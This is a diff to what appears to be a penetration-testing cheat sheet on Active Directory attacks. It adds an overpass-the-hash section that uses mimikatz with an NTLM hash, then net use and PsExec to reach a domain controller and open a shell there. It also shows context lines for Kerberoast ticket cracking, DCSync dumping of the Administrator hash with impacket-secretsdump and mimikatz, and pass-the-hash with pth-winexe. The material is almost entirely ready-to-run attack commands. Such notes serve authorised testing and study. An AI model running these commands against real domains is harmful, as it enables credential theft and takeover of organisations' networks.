@@ -104,6 +104,20 @@ or:
 > python3 /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
 ```
 
+# To be improved:
+###### Overpass the hash / Pass The Key
+```
+Start powershell as the targeted user with mimikatz using the ntlm hash:
+> sekurlsa::pth /user:username /domain:domain.local /ntlm:h1a2s3h4 /run:PowerShell.exe
+using the powershell instance, authenticate to domain controller dc01 so a ticket is generated:
+> net use \\dc01
+Or open a shell on domain controller dc01:
+> PsExec.exe \\dc01 cmd.exe
+
+With Rubeus:
+> .\Rubeus.exe
+```
+
 ###### More Kerberos attacks:
 ```
 https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
@@ -117,7 +131,6 @@ From external with impacket-secretsdump:
 > impacket-secretsdump domain/username:password@10.10.10.10
 
 with Mimikatz:
-> Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
 > lsadump::dcsync /domain:domain.local /user:Administrator
 ```
 
@@ -131,17 +144,6 @@ with Mimikatz:
 ```
 > pth-winexe -U username%hAsHPaRt1:hAsHPaRt2 //10.10.10.10 cmd
 ```
-
-###### Overpass the hash
-```
-https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
-```
-
-###### Pass the ticket
-```
-https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks
-```
-
 
 ###### Mimikatz ~ Retrieve stored credentials
 ```
